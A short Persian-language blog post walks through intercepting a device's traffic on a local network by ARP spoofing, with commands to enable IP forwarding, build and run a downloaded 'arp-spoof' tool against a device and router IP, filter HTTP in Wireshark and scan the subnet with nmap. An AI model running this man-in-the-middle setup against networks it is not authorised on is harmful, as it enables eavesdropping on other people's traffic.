---
layout: post
title: بررسی ترافیک شبکه توسط arp spoofing
img: wireshark_traffic.png
date: 2020-06-22
---

برای بررسی ترافیک هر دستگاهی روی شبکه میشه از این روش که خیلی راحته استفاده کرد.
کاری که میکنیم اینه که میایم به اون دستگاه میگیم آی‌پی روتر (همون مودم مثلا) مال منه! و به روتر میگیم آی‌پی دستگاه مال منه! و اینها بجای اینکه بیان پکت ها رو برای همدیگه بفرستن برای ما میفرستن اشتباهی.
و ما پکت ها رو میگیریم و فوروارد میکنیم برای طرف دیگه و این وسط یه نگاهی هم بهشون میندازیم.

**نصب pcap**
```Bash
Windows: Download and install npcap 0.99* from https://nmap.org/download.html
Ubuntu: sudo apt install libpcap0.8-dev
````

**فعال کردن Packet Forwarding**
```Bash
Windows: https://serverfault.com/questions/929081/how-can-i-enable-packet-forwarding-on-windows
Linux: echo 1 > /proc/sys/net/ipv4/ip_forward
```

دانلود {{<inline_code "arp-spoof.go">}} از اینجا:
{{<link "https://git.io/JfxCx">}}

**اجرای کد**
```Bash
go build
arp-spoof deviceIP routerIP. Example: arp-spoof 192.168.1.12 192.168.1.1
```

**نصب Wireshark:**
{{<link "https://www.wireshark.org/">}}

Wireshark را اجرا کنید. اینترفیس (مثلا وای‌فای) را انتخاب کنید تا شروع به کپچر کند.

حالا مثلا برای گرفتن ترافیک http از آی‌پی موردنظر این فیلتر را وارد میکنیم:
```Bash
http and ip.addr eq 192.168.1.12
```

من روی تلویزیون خونه امتحان کردم و ترافیک زیر رو گرفتم:
{{<image src="wireshark_traffic.png" alt="Wireshark traffic">}}

{{<image src="wireshark_traffic_2.png" alt="Wireshark traffic 2">}}

&nbsp;&nbsp;
#### اضافه:

برای بدست آوردن آی‌پی دستگاه های روی شبکه میشه این کارو کرد:

```Bash
nmap -sP 192.168.1.0/24
```